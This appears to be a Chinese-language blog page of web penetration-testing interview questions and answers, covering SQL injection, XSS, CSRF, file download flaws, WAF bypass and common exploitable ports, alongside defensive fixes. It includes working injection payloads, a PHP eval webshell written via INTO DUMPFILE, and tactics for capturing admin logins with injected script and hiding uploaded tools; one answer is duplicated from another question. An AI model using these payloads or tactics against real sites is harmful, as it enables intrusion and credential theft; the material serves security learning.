<h3 id="23-目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？"><a href="#23-目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？" class="headerlink" title="23.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？"></a>23.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</h3><p>先爆破用户名，再利用被爆破出来的用户名爆破密码。<br>其实有些站点，在登陆处也会这样提示<br>所有和数据库有交互的地方都有可能有注入。</p>
<h3 id="24-目标站发现某txt的下载地址为"><a href="#24-目标站发现某txt的下载地址为" class="headerlink" title="24.目标站发现某txt的下载地址为"></a>24.目标站发现某txt的下载地址为</h3><p><a href="http://www.test.com/down/down.php?file=/upwdown/1.txt%EF%BC%8C%E4%BD%A0%E6%9C%89%E4%BB%80%E4%B9%88%E6%80%9D%E8%B7%AF%EF%BC%9F">http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？</a></p>
<p>这就是传说中的下载漏洞！在file=后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。</p>
<h3 id="25-甲给你一个目标站，并且告诉你根目录下存在-abc-目录，并且此目录下存在编辑器和admin目录。请问你的想法是？"><a href="#25-甲给你一个目标站，并且告诉你根目录下存在-abc-目录，并且此目录下存在编辑器和admin目录。请问你的想法是？" class="headerlink" title="25.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？"></a>25.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？</h3><p>直接在网站二级目录/abc/下扫描敏感文件及目录。</p>
<h3 id="26-在有shell的情况下，如何使用xss实现对目标站的长久控制？"><a href="#26-在有shell的情况下，如何使用xss实现对目标站的长久控制？" class="headerlink" title="26.在有shell的情况下，如何使用xss实现对目标站的长久控制？"></a>26.在有shell的情况下，如何使用xss实现对目标站的长久控制？</h3><p>后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。</p>
<p>在登录后才可以访问的文件中插入XSS脚本。</p>
<h3 id="27-后台修改管理员密码处，原密码显示为-。你觉得该怎样实现读出这个用户的密码？"><a href="#27-后台修改管理员密码处，原密码显示为-。你觉得该怎样实现读出这个用户的密码？" class="headerlink" title="27.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？"></a>27.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？</h3><p>审查元素 把密码处的password属性改成text就明文显示了</p>
<h3 id="28-目标站无防护，上传图片可以正常访问，上传脚本格式访问则403-什么原因？"><a href="#28-目标站无防护，上传图片可以正常访问，上传脚本格式访问则403-什么原因？" class="headerlink" title="28.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？"></a>28.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？</h3><p>原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过</p>
<h3 id="29-审查元素得知网站所使用的防护软件，你觉得怎样做到的？"><a href="#29-审查元素得知网站所使用的防护软件，你觉得怎样做到的？" class="headerlink" title="29.审查元素得知网站所使用的防护软件，你觉得怎样做到的？"></a>29.审查元素得知网站所使用的防护软件，你觉得怎样做到的？</h3><p>在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12看HTML体部 比如护卫神就可以在名称那看到内容。</p>
<h3 id="30-在win2003服务器中建立一个-zhongzi文件夹用意何为？"><a href="#30-在win2003服务器中建立一个-zhongzi文件夹用意何为？" class="headerlink" title="30.在win2003服务器中建立一个 .zhongzi文件夹用意何为？"></a>30.在win2003服务器中建立一个 .zhongzi文件夹用意何为？</h3><p>隐藏文件夹，为了不让管理员发现你传上去的工具。</p>
<h3 id="31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由："><a href="#31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由：" class="headerlink" title="31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由："></a>31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由：</h3><p>A. demo.jsp?id=2+1<br>B. demo.jsp?id=2-1<br>选B，在 URL 编码中 + 代表空格，可能会造成混淆</p>
<h3 id="32、以下链接存在-sql-注入漏洞，对于这个变形注入，你有什么思路？"><a href="#32、以下链接存在-sql-注入漏洞，对于这个变形注入，你有什么思路？" class="headerlink" title="32、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？"></a>32、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？</h3><p>demo.do?DATA=AjAxNg==<br>DATA有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试</p>
<h3 id="33、发现-demo-jsp-uid-110-注入点，你有哪几种思路获取-webshell，哪种是优选？"><a href="#33、发现-demo-jsp-uid-110-注入点，你有哪几种思路获取-webshell，哪种是优选？" class="headerlink" title="33、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？"></a>33、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？</h3><p>有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell 使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高 通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p>
<h3 id="34、CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？"><a href="#34、CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？" class="headerlink" title="34、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？"></a>34、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h3><p>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</p>
<p>CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p>
<h3 id="35、CSRF、SSRF和重放攻击有什么区别？"><a href="#35、CSRF、SSRF和重放攻击有什么区别？" class="headerlink" title="35、CSRF、SSRF和重放攻击有什么区别？"></a>35、CSRF、SSRF和重放攻击有什么区别？</h3><p>CSRF是跨站请求伪造攻击，由客户端发起 SSRF是服务器端请求伪造，由服务器发起 重放攻击是将截获的数据包进行重放，达到身份认证等目的</p>
<h3 id="36、说出至少三种业务逻辑漏洞，以及修复方式？"><a href="#36、说出至少三种业务逻辑漏洞，以及修复方式？" class="headerlink" title="36、说出至少三种业务逻辑漏洞，以及修复方式？"></a>36、说出至少三种业务逻辑漏洞，以及修复方式？</h3><p>密码找回漏洞中存在</p>
<p>1）密码允许暴力破解、</p>
<p>2）存在通用型找回凭证、</p>
<p>3）可以跳过验证步骤、</p>
<p>4）找回凭证可以拦包获取</p>
<p>等方式来通过厂商提供的密码找回功能来得到密码。身份认证漏洞中最常见的是</p>
<p>1）会话固定攻击</p>
<p>2） Cookie 仿冒</p>
<p>只要得到 Session 或 Cookie 即可伪造用户身份。验证码漏洞中存在</p>
<p>1）验证码允许暴力破解</p>
<p>2）验证码可以通过 Javascript 或者改包的方法来进行绕过</p>
<h3 id="37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？"><a href="#37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？" class="headerlink" title="37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？"></a>37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get &#x2F;ecskins&#x2F;demo.jsp?uid&#x3D;2016031900&amp;keyword&#x3D;”hello world”</span><br><span class="line">HTTP&#x2F;1.1Host:***.com:82User-Agent:Mozilla&#x2F;</span><br><span class="line">5.0 Firefox&#x2F;40Accept:text&#x2F;css,&#x2F;;q&#x3D;0.1</span><br><span class="line">Accept-Language:zh-CN;zh;q&#x3D;0.8;en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Referer:http:&#x2F;&#x2F;*******.com&#x2F;eciop&#x2F;orderForCC&#x2F;</span><br><span class="line">cgtListForCC.htm?zone&#x3D;11370601&amp;v&#x3D;145902</span><br><span class="line">Cookie:myguid1234567890&#x3D;1349db5fe50c372c3d995709f54c273d;</span><br><span class="line">uniqueserid&#x3D;session_OGRMIFIYJHAH5_HZRQOZAMHJ;</span><br><span class="line">st_uid&#x3D;N90PLYHLZGJXI-NX01VPUF46W;</span><br><span class="line">status&#x3D;True</span><br><span class="line">Connection:keep-alive</span><br></pre></td></tr></table></figure>

<p>有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell 使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高 通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p>
<h3 id="38、给你一个网站你是如何来渗透测试的-在获取书面授权的前提下。"><a href="#38、给你一个网站你是如何来渗透测试的-在获取书面授权的前提下。" class="headerlink" title="38、给你一个网站你是如何来渗透测试的?在获取书面授权的前提下。"></a>38、给你一个网站你是如何来渗透测试的?在获取书面授权的前提下。</h3><h3 id="39、sqlmap，怎么对一个注入点注入？"><a href="#39、sqlmap，怎么对一个注入点注入？" class="headerlink" title="39、sqlmap，怎么对一个注入点注入？"></a>39、sqlmap，怎么对一个注入点注入？</h3><p>1）如果是get型号，直接，sqlmap -u “诸如点网址”.<br>2) 如果是post型诸如点，可以sqlmap -u “注入点网址” –data=”post的参数”<br>3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用号替换，放到文件里，然后sqlmap -r “文件地址”</p>
<h3 id="40、nmap，扫描的几种方式"><a href="#40、nmap，扫描的几种方式" class="headerlink" title="40、nmap，扫描的几种方式"></a>40、nmap，扫描的几种方式</h3><h3 id="41、sql注入的几种类型？"><a href="#41、sql注入的几种类型？" class="headerlink" title="41、sql注入的几种类型？"></a>41、sql注入的几种类型？</h3><p>1）报错注入<br>2）bool型注入<br>3）延时注入<br>4）宽字节注入</p>
<h3 id="42、报错注入的函数有哪些？10个"><a href="#42、报错注入的函数有哪些？10个" class="headerlink" title="42、报错注入的函数有哪些？10个"></a>42、报错注入的函数有哪些？10个</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】</span><br><span class="line">2）通过floor报错 向下取整</span><br><span class="line">3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)</span><br><span class="line">4）.geometrycollection()select from test where id&#x3D;1 and geometrycollection((select from(selectfrom(select user())a)b));</span><br><span class="line">5）.multipoint()select from test where id&#x3D;1 and multipoint((select from(select from(select user())a)b));</span><br><span class="line">6）.polygon()select from test where id&#x3D;1 and polygon((select from(select from(select user())a)b));</span><br><span class="line">7）.multipolygon()select from test where id&#x3D;1 and multipolygon((select from(select from(select user())a)b));</span><br><span class="line">8）.linestring()select from test where id&#x3D;1 and linestring((select from(select from(select user())a)b));</span><br><span class="line">9）.multilinestring()select from test where id&#x3D;1 and multilinestring((select from(select from(select user())a)b));</span><br><span class="line">10）.exp()select from test where id&#x3D;1 and exp(~(select * from</span><br></pre></td></tr></table></figure>

<h3 id="43、延时注入如何来判断？"><a href="#43、延时注入如何来判断？" class="headerlink" title="43、延时注入如何来判断？"></a>43、延时注入如何来判断？</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(ascii(substr(“hello”, 1, 1))&#x3D;104, sleep(5), 1)</span><br></pre></td></tr></table></figure>

<h3 id="44、盲注和延时注入的共同点？"><a href="#44、盲注和延时注入的共同点？" class="headerlink" title="44、盲注和延时注入的共同点？"></a>44、盲注和延时注入的共同点？</h3><p>都是一个字符一个字符的判断</p>
<h3 id="45、如何拿一个网站的webshell？上传，后台编辑模板，sql注入写文件，命令执行，代码执行，-一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等"><a href="#45、如何拿一个网站的webshell？上传，后台编辑模板，sql注入写文件，命令执行，代码执行，-一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等" class="headerlink" title="45、如何拿一个网站的webshell？上传，后台编辑模板，sql注入写文件，命令执行，代码执行， 一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等"></a>45、如何拿一个网站的webshell？上传，后台编辑模板，sql注入写文件，命令执行，代码执行， 一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等</h3><h3 id="46、sql注入写文件都有哪些函数？"><a href="#46、sql注入写文件都有哪些函数？" class="headerlink" title="46、sql注入写文件都有哪些函数？"></a>46、sql注入写文件都有哪些函数？</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;一句话&#39; into outfile &#39;路径&#39;</span><br><span class="line">select &#39;一句话&#39; into dumpfile &#39;路径&#39;</span><br><span class="line">select &#39;&lt;?php eval($_POST[1]) ?&gt;&#39; into dumpfile  &#39;d:\wwwroot\baidu.com\nvhack.php&#39;;</span><br></pre></td></tr></table></figure>

<h3 id="47、如何防止CSRF"><a href="#47、如何防止CSRF" class="headerlink" title="47、如何防止CSRF?"></a>47、如何防止CSRF?</h3><p>1）验证referer<br>2）验证token<br>详细：<a href="http://cnodejs.org/topic/5533dd6e9138f09b629674fd">http://cnodejs.org/topic/5533dd6e9138f09b629674fd</a></p>
<h3 id="48、owasp-漏洞都有哪些？"><a href="#48、owasp-漏洞都有哪些？" class="headerlink" title="48、owasp 漏洞都有哪些？"></a>48、owasp 漏洞都有哪些？</h3><p>1）SQL注入防护方法：<br>2）失效的身份认证和会话管理<br>3）跨站脚本攻击XSS<br>4）直接引用不安全的对象<br>5）安全配置错误<br>6）敏感信息泄露<br>7）缺少功能级的访问控制<br>8）跨站请求伪造CSRF<br>9）使用含有已知漏洞的组件<br>10）未验证的重定向和转发</p>
<h3 id="49、SQL注入防护方法？"><a href="#49、SQL注入防护方法？" class="headerlink" title="49、SQL注入防护方法？"></a>49、SQL注入防护方法？</h3><p>1）使用安全的API<br>2）对输入的特殊字符进行Escape转义处理<br>3）使用白名单来规范化输入验证方法<br>4）对客户端输入进行控制，不允许输入SQL注入相关的特殊字符<br>5）服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。</p>
<h3 id="50、代码执行，文件读取，命令执行的函数都有哪些？"><a href="#50、代码执行，文件读取，命令执行的函数都有哪些？" class="headerlink" title="50、代码执行，文件读取，命令执行的函数都有哪些？"></a>50、代码执行，文件读取，命令执行的函数都有哪些？</h3><p>1）代码执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval,preg_replace+&#x2F;e,assert,call_user_func,call_user_func_array,create_function</span><br></pre></td></tr></table></figure>

<p>2）文件读取：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_get_contents(),highlight_file(),fopen(),read</span><br><span class="line">file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等</span><br></pre></td></tr></table></figure>

<p>3)命令执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</span><br></pre></td></tr></table></figure>

<h3 id="51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？"><a href="#51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？" class="headerlink" title="51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？"></a>51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？</h3><p>src指定一个远程的脚本文件，获取referer</p>
<h3 id="52、img标签除了onerror属性外，并且src属性的后缀名，必须以-jpg结尾，怎么获取管理员路径。"><a href="#52、img标签除了onerror属性外，并且src属性的后缀名，必须以-jpg结尾，怎么获取管理员路径。" class="headerlink" title="52、img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。"></a>52、img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。</h3><p>1）远程服务器修改apache配置文件，配置.jpg文件以php方式来解析 AddType application/x-httpd-php .jpg </p>
<h3 id="53、为什么aspx木马权限比asp大？"><a href="#53、为什么aspx木马权限比asp大？" class="headerlink" title="53、为什么aspx木马权限比asp大？"></a>53、为什么aspx木马权限比asp大？</h3><p>aspx使用的是.net技术。IIS 中默认不支持，ASP只是脚本语言而已。入侵的时候asp的木马一般是guest权限…APSX的木马一般是users权限。</p>
<h3 id="54、如何绕过waf？"><a href="#54、如何绕过waf？" class="headerlink" title="54、如何绕过waf？"></a>54、如何绕过waf？</h3><p>大小写转换法<br>干扰字符 /!/<br>编码 base64 unicode hex url ascll<br>复参数</p>
<h3 id="55、如何向服务器写入webshell？"><a href="#55、如何向服务器写入webshell？" class="headerlink" title="55、如何向服务器写入webshell？"></a>55、如何向服务器写入webshell？</h3><p>各种上传漏洞<br>mysql具有写入权限,用sql语句写入shell<br>http put方法</p>
<h3 id="56、渗透测试中常见的端口"><a href="#56、渗透测试中常见的端口" class="headerlink" title="56、渗透测试中常见的端口"></a>56、渗透测试中常见的端口</h3><p>a、web类(web漏洞/敏感目录) 第三方通用组件漏洞struts thinkphp jboss ganglia zabbix</p>
<blockquote>
<p>80 web<br>80-89 web<br>8000-9090 web</p>
</blockquote>
<p>b、数据库类(扫描弱口令)</p>
<blockquote>
<p>1433 MSSQL<br>1521 Oracle<br>3306 MySQL<br>5432 PostgreSQL</p>
</blockquote>
<p>c、特殊服务类(未授权/命令执行类/漏洞)</p>
<blockquote>
<p>443 SSL心zang滴血<br>873 Rsync未授权<br>5984 CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a><br>6379 redis未授权<br>7001,7002 WebLogic默认弱口令，反序列<br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br>11211 memcache未授权访问<br>27017,27018 Mongodb未授权访问<br>50000 SAP命令执行<br>50070,50030 hadoop默认端口未授权访问</p>
</blockquote>
<p>d、常用端口类(扫描弱口令/端口爆破)</p>
<blockquote>
<p>21 ftp<br>22 SSH<br>23 Telnet<br>2601,2604 zebra路由，默认密码zebra<br>3389 远程桌面</p>
</blockquote>
<p>ALL、端口合计详情</p>
<blockquote>
<p>21 ftp<br>22 SSH<br>23 Telnet<br>80 web<br>80-89 web<br>161 SNMP<br>389 LDAP<br>443 SSL心zang滴血以及一些web漏洞测试<br>445 SMB<br>512,513,514 Rexec<br>873 Rsync未授权<br>1025,111 NFS<br>1433 MSSQL<br>1521 Oracle:(iSqlPlus Port:5560,7778)<br>2082/2083 cpanel主机管理系统登陆 （国外用较多）<br>2222 DA虚拟主机管理系统登陆 （国外用较多）<br>2601,2604 zebra路由，默认密码zebra<br>3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了<br>3306 MySQL<br>3312/3311 kangle主机管理系统登陆<br>3389 远程桌面<br>4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网<br>5432 PostgreSQL<br>5900 vnc<br>5984 CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a><br>6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网<br>6379 redis未授权<br>7001,7002 WebLogic默认弱口令，反序列<br>7778 Kloxo主机控制面板登录<br>8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上<br>8080 tomcat/WDCP主机管理系统，默认弱口令<br>8080,8089,9090 JBOSS<br>8083 Vestacp主机管理系统 （国外用较多）<br>8649 ganglia<br>8888 amh/LuManager 主机管理系统默认端口<br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br>10000 Virtualmin/Webmin 服务器虚拟主机管理系统<br>11211 memcache未授权访问<br>27017,27018 Mongodb未授权访问<br>28017 mongodb统计页面<br>50000 SAP命令执行<br>50070,50030 hadoop默认端口未授权访问</p>
</blockquote>
<h2 id="三、某安全厂商一面"><a href="#三、某安全厂商一面" class="headerlink" title="三、某安全厂商一面"></a>三、某安全厂商一面</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">了解哪些漏洞</span><br><span class="line"></span><br><span class="line">文件上传有哪些防护方式</span><br><span class="line"></span><br><span class="line">用什么扫描端口，目录</span><br><span class="line"></span><br><span class="line">如何判断注入</span><br><span class="line"></span><br><span class="line">注入有防护怎么办</span><br><span class="line"></span><br><span class="line">有没有写过tamper</span><br><span class="line"></span><br><span class="line">3306 1443 8080是什么端口</span><br><span class="line"></span><br><span class="line">计算机网络从物理层到应用层xxxx</span><br><span class="line"></span><br><span class="line">有没有web服务开发经验</span><br><span class="line"></span><br><span class="line">如何向服务器写入webshell</span><br><span class="line"></span><br><span class="line">有没有用过xss平台</span><br><span class="line"></span><br><span class="line">网站渗透的流程</span><br><span class="line"></span><br><span class="line">mysql两种提权方式（udf，？）</span><br><span class="line"></span><br><span class="line">常见加密方式xxx</span><br><span class="line"></span><br><span class="line">ddos如何防护</span><br><span class="line"></span><br><span class="line">有没有抓过包，会不会写wireshark过滤规则</span><br><span class="line"></span><br><span class="line">清理日志要清理哪些</span><br></pre></td></tr></table></figure>

<h2 id="四、SQL注入防护"><a href="#四、SQL注入防护" class="headerlink" title="四、SQL注入防护"></a>四、SQL注入防护</h2><p>1、使用安全的API<br>2、对输入的特殊字符进行Escape转义处理<br>3、使用白名单来规范化输入验证方法<br>4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符<br>5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。<br>6、规范编码,字符集</p>
<h2 id="五、为什么参数化查询可以防止SQL注入"><a href="#五、为什么参数化查询可以防止SQL注入" class="headerlink" title="五、为什么参数化查询可以防止SQL注入"></a>五、为什么参数化查询可以防止SQL注入</h2><p>原理:</p>
<p>使用参数化查询数据库服务器不会把参数的内容当作sql指令的一部分来执行，是在数据库完成sql指令的编译后才套用参数运行</p>
<p>简单的说: 参数化能防注入的原因在于,语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑</p>
<h2 id="六、SQL头注入点"><a href="#六、SQL头注入点" class="headerlink" title="六、SQL头注入点"></a>六、SQL头注入点</h2><p>UA<br>REFERER<br>COOKIE<br>IP</p>
<h2 id="七、盲注是什么？怎么盲注？"><a href="#七、盲注是什么？怎么盲注？" class="headerlink" title="七、盲注是什么？怎么盲注？"></a>七、盲注是什么？怎么盲注？</h2><p>盲注是在SQL注入攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在SQL注入和利用的方式。盲注的手段有两种，一个是通过页面的返回内容是否正确(boolean-based)，来验证是否存在注入。一个是通过sql语句处理时间的不同来判断是否存在注入(time-based)，在这里，可以用benchmark，sleep等造成延时效果的函数，也可以通过构造大笛卡儿积的联合查询表来达到延时的目的。</p>
<h2 id="八、宽字节注入产生原理以及根本原因"><a href="#八、宽字节注入产生原理以及根本原因" class="headerlink" title="八、宽字节注入产生原理以及根本原因"></a>八、宽字节注入产生原理以及根本原因</h2><h3 id="1、产生原理"><a href="#1、产生原理" class="headerlink" title="1、产生原理"></a>1、产生原理</h3><p>在数据库使用了宽字符集而WEB中没考虑这个问题的情况下，在WEB层，由于0XBF27是两个字符，在PHP中比如addslash和magic_quotes_gpc开启时，由于会对0x27单引号进行转义，因此0xbf27会变成0xbf5c27,而数据进入数据库中时，由于0XBF5C是一个另外的字符，因此\转义符号会被前面的bf带着”吃掉”，单引号由此逃逸出来可以用来闭合语句。</p>
<h3 id="2、在哪里编码"><a href="#2、在哪里编码" class="headerlink" title="2、在哪里编码"></a>2、在哪里编码</h3><h3 id="3、根本原因"><a href="#3、根本原因" class="headerlink" title="3、根本原因"></a>3、根本原因</h3><p>character_set_client(客户端的字符集)和character_set_connection(连接层的字符集)不同,或转换函数如，iconv、mb_convert_encoding使用不当。</p>
<h3 id="4、解决办法"><a href="#4、解决办法" class="headerlink" title="4、解决办法"></a>4、解决办法</h3><p>统一数据库、Web应用、操作系统所使用的字符集，避免解析产生差异，最好都设置为UTF-8。或对数据进行正确的转义，如mysql_real_escape_string+mysql_set_charset的使用。</p>
<h3 id="5、SQL里面只有update怎么利用"><a href="#5、SQL里面只有update怎么利用" class="headerlink" title="5、SQL里面只有update怎么利用"></a>5、SQL里面只有update怎么利用</h3><p>先理解这句 SQL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE user SET password&#x3D;&#39;MD5($password)&#39;, homepage&#x3D;&#39;$homepage&#39; WHERE id&#x3D;&#39;$id&#39;</span><br></pre></td></tr></table></figure>

<p>如果此 SQL 被修改成以下形式，就实现了注入</p>
<p>a、修改 homepage 值为<a href="http://xxx.net&/#39;">http://xxx.net&#39;</a>, userlevel=’3</p>
<p>之后 SQL 语句变为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE user SET password&#x3D;&#39;mypass&#39;, homepage&#x3D;&#39;http:&#x2F;&#x2F;xxx.net&#39;, userlevel&#x3D;&#39;3&#39; WHERE id&#x3D;&#39;$id&#39;</span><br></pre></td></tr></table></figure>

<p>userlevel 为用户级别</p>
<p>b、修改 password 值为mypass)’ WHERE username=’admin’#</p>
<p>之后 SQL 语句变为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE user SET password&#x3D;&#39;MD5(mypass)&#39; WHERE username&#x3D;&#39;admin&#39;#)&#39;, homepage&#x3D;&#39;$homepage&#39; WHERE id&#x3D;&#39;$id&#39;</span><br></pre></td></tr></table></figure>

<p>c、修改 id 值为’ OR username=’admin’之后 SQL 语句变为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE user SET password&#x3D;&#39;MD5($password)&#39;, homepage&#x3D;&#39;$homepage&#39; WHERE id&#x3D;&#39;&#39; OR username&#x3D;&#39;admin&#39;</span><br></pre></td></tr></table></figure>

<h2 id="九、SQL如何写shell-单引被过滤怎么办"><a href="#九、SQL如何写shell-单引被过滤怎么办" class="headerlink" title="九、SQL如何写shell/单引被过滤怎么办"></a>九、SQL如何写shell/单引被过滤怎么办</h2><p>写shell: root权限，GPC关闭，知道文件路径 outfile函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:81&#x2F;sqli.php?id&#x3D;1 into outfile &#39;C:\\wamp64\\www\\phpinfo.php&#39; FIELDS TERMINATED BY &#39;&lt;?php phpinfo(); ?&gt;&#39;</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1:81&#x2F;sqli.php?id&#x3D;-1 union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile &#39;C:\\wamp64\\www\\phpinfo.php&#39;</span><br></pre></td></tr></table></figure>

<p>宽字节注入</p>
<h3 id="1、代替空格的方法"><a href="#1、代替空格的方法" class="headerlink" title="1、代替空格的方法"></a>1、代替空格的方法</h3><p>%0a、%0b、%a0 等<br>/**/ 等注释符<br>&lt;&gt;</p>
<h3 id="2、mysql的网站注入，5-0以上和5-0以下有什么区别"><a href="#2、mysql的网站注入，5-0以上和5-0以下有什么区别" class="headerlink" title="2、mysql的网站注入，5.0以上和5.0以下有什么区别"></a>2、mysql的网站注入，5.0以上和5.0以下有什么区别</h3><p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p>
<p>5.0以下是多用户单操作，5.0以上是多用户多操做。</p>
<h2 id="十、XSS"><a href="#十、XSS" class="headerlink" title="十、XSS"></a>十、XSS</h2><p>1、XSS原理</p>
<p>反射型</p>
<p>用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。需要诱使用户“点击”一个恶意链接，才能攻击成功</p>
<p>存储型</p>
<p>存储型XSS会把用户输入的数据“存储”在服务器端。这种XSS具有很强的稳定性。</p>
<p>DOM型</p>
<p>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。</p>
<h3 id="2、DOM型和反射型的区别"><a href="#2、DOM型和反射型的区别" class="headerlink" title="2、DOM型和反射型的区别"></a>2、DOM型和反射型的区别</h3><p>反射型XSS：通过诱导用户点击，我们构造好的恶意payload才会触发的XSS。反射型XSS的检测我们在每次请求带payload的链接时页面应该是会带有特定的畸形数据的。DOM型：通过修改页面的DOM节点形成的XSS。DOM-based XSS由于是通过js代码进行dom操作产生的XSS，所以在请求的响应中我们甚至不一定会得到相应的畸形数据。根本区别在我看来是输出点的不同。</p>
